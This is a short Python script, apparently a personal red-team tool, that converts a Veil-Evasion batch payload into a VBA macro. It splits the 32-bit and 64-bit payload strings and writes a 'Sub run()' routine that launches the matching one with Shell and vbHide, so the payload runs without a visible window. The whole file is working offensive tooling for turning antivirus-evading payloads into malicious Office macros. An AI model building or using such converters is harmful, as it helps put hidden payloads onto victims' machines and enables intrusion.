#!/usr/bin/env python3
'''
==================================================
 Veil-Evasion Payload bat2vba converter
    
    Author: Bekhzod Umarov,
            bumar1@unh.newhaven.edu
    Date:   03/01/2017
==================================================
'''
import sys

if __name__=='__main__':
    if len(sys.argv) != 3:
        print(sys.argv[0] + " by Bek")
        print("Usage:\n\t" + sys.argv[0] + " payload.bat output.vba")
        sys.exit(1)

    PAYLOADFILE = sys.argv[1]
    OUTPUTFILE  = sys.argv[2]

    with open(PAYLOADFILE,"r") as f:
        data = f.read()
        data = data[44:-1]
        elstr = ") else ("
        data32 = data[:data.find(elstr)]
        data64 = data[data.find(elstr)+len(elstr):]
        data32 = data32.replace('"','" & Chr(34) & "')[:-4]
        data64 = data64.replace('"','" & Chr(34) & "')[:-4]

    with open(OUTPUTFILE,"w") as f:
        f.write("Sub run()\r\n")
        data32_1 = data32[:len(data32)//2]
        data32_2 = data32[len(data32)//2:]
        data64_1 = data64[:len(data64)//2]
        data64_2 = data64[len(data64)//2:]
        f.write("pl32="+'"'+data32_1+'" + _\r\n')
        f.write('"'+data32_2+'\r\n')
        f.write("pl64="+'"'+data64_1+'" + _\r\n')
        f.write('"'+data64_2+'\r\n')
        f.write("#If Win64 Then\r\n")
        f.write("retVal=Shell(pl64, vbHide)\r\n")
        f.write("#Else\r\n")
        f.write("retVal=Shell(pl32, vbHide)\r\n")
        f.write("#End If\r\n")
        f.write("End Sub\r\n")

